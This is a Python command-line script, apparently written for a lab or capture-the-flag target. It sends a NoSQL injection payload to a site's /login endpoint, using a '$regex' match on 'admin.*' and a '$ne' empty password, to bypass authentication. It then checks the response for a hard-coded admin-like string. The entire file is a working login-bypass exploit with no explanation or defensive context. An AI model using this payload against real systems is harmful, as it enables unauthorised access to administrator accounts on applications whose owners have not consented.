#!/usr/bin/python3

import requests
import urllib3
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def req(url):
    vuln_path = url+"/login"
    data = {
            "username":{"$regex":"admin.*"},
            "password":{"$ne":""}
            }
    

    r = requests.post(vuln_path, json=data)
    time.sleep(5)
    if 'adminyto2leq8' in r.text:
        print("Exploited Succesfull!")
    else :
        print("failed try again...")


def check(url):
    if 'https://' in url:
        print("Exploiting...")
        req(url)
    else :
        print("Invalid Url")


def main():
    if len(sys.argv)!=2:
        print("[+] Usage: %s <url> <paylaod>"% sys.argv[0])
        sys.exit(1)
    url = sys.argv[1]
    check(url)


if __name__=="__main__":
    main()